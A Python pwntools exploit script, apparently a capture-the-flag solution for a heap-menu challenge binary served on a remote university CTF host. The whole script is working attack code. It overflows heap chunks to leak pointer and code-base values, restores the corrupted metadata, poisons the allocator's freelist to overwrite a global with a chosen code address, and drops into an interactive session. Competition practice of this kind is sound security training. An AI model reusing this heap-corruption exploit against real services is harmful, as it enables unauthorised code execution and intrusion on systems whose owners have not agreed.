#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './heap'
context.os = 'linux'
context.arch = 'amd64'
context.timeout = 5
#context.log_level = 'debug'

debug = 0
if debug:
    io = process('./heap')
else:
    io = remote('scr1w.dlut.edu.cn',28040)

elf = ELF('./heap')
#libc = ELF('')


def p():
    gdb.attach(proc.pidof(io)[0])

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

def cmd(i, prompt=b"> "):
    io.sendlineafter(prompt, i)

def add(size):
    cmd(b'1')
    size = int(hex(size),16)
    io.sendlineafter(b"size: ",str(size).encode())

def edit(idx, content):
    cmd(b'3')
    io.sendlineafter(b"index: ",str(idx).encode())
    io.sendafter(b"data: ", content)

def show(idx):
    cmd(b'4')
    io.sendlineafter(b"index: ",str(idx).encode())

def dele(idx):
    cmd(b'2')
    io.sendlineafter(b"index: ",str(idx).encode())

for i in range(3):
    add(0x8)

add(0x100) # 3
add(0x100)

#* leak codebase
dele(3)
#p()
payload1 = b'a'*0x10 + b'\n'
edit(2,payload1)
show(2)
io.recvuntil(b'a' * 0x10 + b'\n')
chunk3_rand_bytes = u64(b'\x00' + io.recv(7))
leak("chunk3_rand_bytes", chunk3_rand_bytes)
payload1 = b'a'*0x20 
edit(2,payload1)
show(2)
# recv fd_next_allocated
io.recvuntil(b'a' * 0x20)
chunk3_fd_next_allocated = u64(io.recv(6) + b'\x00' * 2)
leak("chunk3_fd_next_allocated",chunk3_fd_next_allocated)
payload1 = b'a'*0x28 
edit(2,payload1)
show(2)
# recv codebase
io.recvuntil(b'a' * 0x28)
code_base = u64(io.recv(6) + b'\x00' * 2) - 0x203060
leak("code_base",code_base)
payload1 = flat(
    b'a' * 0x10, chunk3_rand_bytes, 0x00000110aaaaaaaa, chunk3_fd_next_allocated, code_base + 0x203060
)
#*复原
edit(2,payload1)


add(0x100)

dele(2)
dele(1)
dele(0)

add(0x8) #0


payload = b'a' * 0x10 + b'\n'
edit(0,payload)
show(0)
io.recvuntil(b'a' * 0x10 + b'\n')
chunk2_rand_bytes = u64(b'\x00' + io.recv(7))
leak(b"chunk2_rand_bytes", chunk2_rand_bytes)

# posion fastbin
payload2 = flat(
    b'a'*0x10, chunk2_rand_bytes, 0x00000110aaaaaaaa, chunk3_fd_next_allocated+0x170, code_base + 0x2031e0-0x28
)
edit(0,payload2)
add(0x8) #1
add(0x8) #2
edit(2, p64(code_base + 0xead))
add(0x1)

io.interactive()
